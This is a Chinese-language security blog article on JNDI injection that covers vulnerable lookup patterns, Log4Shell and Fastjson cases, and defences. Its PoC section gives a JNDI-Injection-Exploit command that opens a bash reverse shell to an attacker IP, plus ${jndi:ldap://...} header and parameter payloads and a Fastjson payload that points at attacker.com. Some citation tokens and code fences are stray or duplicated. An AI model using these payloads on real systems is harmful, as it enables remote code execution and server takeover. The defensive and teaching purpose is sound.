#  JNDI注入漏洞分析   
原创 锐鉴安全  锐鉴安全   2025-05-14 12:01  
  
声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。  
  
关注公众号，设置为星标，不定期有宠粉福利  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RLTNmn7FBP4ricRiaXQ6WVVlTAgCW8HUbC2rHkicA2rpDNEPAGyiatRibqB9LN5NyHcqLCmbibM1siaumqF5Yu6UtSsYA/640?wx_fmt=png&from=appmsg "")  
  
  
**引言**  
  
近年来，JNDI注入漏洞因其高危害性（如Log4j的Log4Shell漏洞）成为安全领域的焦点。攻击者可通过此类漏洞实现远程代码执行（RCE），甚至完全控制目标服务器。本文将深入剖析JNDI注入的原理、常见攻击手法（PoC）及防御策略，帮助开发者与安全从业者全面认知风险。  
  
### 一、JNDI注入漏洞原理  
  
**1. JNDI的核心机制**  
  
JNDI（Java命名与目录接口）是Java提供的资源访问API，支持通过名称动态加载远程对象，例如ldap://  
或rmi://  
协议资源。其核心风险在于：**未经验证的输入直接传递给InitialContext.lookup()方法**  
，导致应用解析恶意地址并加载远程类。  
  
  
**2. 漏洞触发条件**  
- **动态解析用户输入**  
：如HTTP参数、日志内容等未过滤的场景（如Log4j记录${jndi:...}  
）  
。  
  
- **低版本Java环境**  
：JDK ≤8u191/11.0.1默认允许远程类加载。  
  
- **高版本绕过**  
：若禁用远程加载，攻击者可利用本地ClassPath中的类（如Tomcat的BeanFactory  
）构造利用链。  
  
**3. 漏洞常见功能点**  
- 动态资源查找（如数据库连接、消息队列）  
  
场景：应用通过用户输入动态构造JNDI名称获取资源（如数据源、JMS队列）。  
  
风险代码示例：  
  
```
String jndiName = request.getParameter("datasource");
DataSource ds = (DataSource) new InitialContext().lookup(jndiName); // 用户输入直接传入
```  
  
  
- 日志记录与错误处理  
  
场景：日志框架（如Log4j2）未过滤用户输入，解析${jndi:...}表达式。  
  
风险代码示例：  
```
logger.error("User input: " + userControlledData); // userControlledData含${jndi:ldap://...}
```  
  
- 配置文件或管理接口  
  
场景：管理员通过界面或API配置JNDI资源，输入未经验证。  
  
风险示例：  
```
<!-- 外部篡改配置文件中的JNDI名称 -->
<Resource name="jdbc/MaliciousDS" auth="Container" type="javax.sql.DataSource"
          url="ldap://attacker.com/Exploit"/>
```  
  
- 远程服务调用（RMI/LDAP集成）  
  
场景：应用通过用户提供的地址调用远程服务（如RMI Registry、LDAP查询）。  
  
风险代码示例：  
```
String serviceUrl = request.getParameter("service");
Object obj = new InitialContext().lookup(serviceUrl); // 输入如rmi://attacker:1099/Exploit
```  
  
- 反序列化操作  
  
场景：反序列化数据中嵌入恶意JNDI名称，触发自动解析。  
  
风险示例（Fastjson漏洞）：  
```
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com/Exploit",
  "autoCommit": true
}
```  
  
- 动态类加载机制  
  
场景：通过用户输入指定类名，间接触发JNDI查找。  
  
风险代码示例：  
```
String className = request.getParameter("driver");
Class.forName(className); // 若className指向恶意JNDI资源
```  
  
  
二、JNDI注入攻击PoC实战  
  
1. 基础攻击流程  
  
(1) 搭建恶意服务  
  
使用工具（如JNDI-Injection-Exploit）快速启动LDAP/RMI服务，并托管恶意类文件：  
  
```
# 启动LDAP服务并绑定恶意类
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,<base64命令>}|{base64,-d}|{bash,-i}" -A 攻击者IP:cite[2]:cite[6]
```  
  
  
  
(2) 构造Payload  
  
将生成的JNDI链接注入目标输入点，例如：  
  
HTTP参数如username=${jndi:ldap://攻击者IP/Exploit}  
  
日志触发如logger.error("${jndi:rmi://攻击者IP:1099/Exploit}")  
  
```
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe"); // 执行系统命令
        } catch (Exception e) {}
    }
}
```  
  
  
(3) 恶意类示例  
```
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe"); // 执行系统命令
        } catch (Exception e) {}
    }
}
```  
  
### 三、典型案例分析  
  
1. Log4j2的Log4Shell漏洞（CVE-2021-44228）  
  
漏洞点：Log4j2在记录日志时解析${jndi:ldap://...}，触发远程类加载。  
  
攻击示例：在HTTP头中注入Payload：  
```
GET / HTTP/1.1
User-Agent: ${jndi:ldap://攻击者IP/Exploit}
```  
  
目标服务器记录日志时即触发漏洞。  
  
  
2. Fastjson反序列化漏洞  
  
利用链：通过@type指定恶意类（如JdbcRowSetImpl），触发JNDI注入：  
```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://攻击者IP/Exploit"}
```:cite[7]
```  
  
### 四、防御建议  
  
**1、升级环境与依赖**  
  
JDK≥8u191/11.0.1,com.sun.jndi.ldap.object.trustURLCodebase=false。  
  
升级Log4j至≥2.17.1，并禁用JNDI功能。  
  
****  
**2、代码与输入过滤**  
  
避免将用户输入直接传递给lookup()  
方法。  
  
对输入内容严格过滤，禁止jndi:  
、ldap://  
等危险协议。  
  
  
**3、网络与监控**  
  
限制应用出站连接，拦截非常规协议请求（如非内网LDAP/RMI）。  
  
部署WAF规则，拦截包含${jndi:  
特征的请求。  
  
### 五、总结  
  
JNDI注入漏洞的根源在于**不可信输入的动态解析**  
与**环境配置缺陷。JNDI漏洞利用的四大核心条件：输入可控、动态解析、类加载能力、攻击路径可达**  
。防御需从代码规范、环境加固、流量监控多层面入手。  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
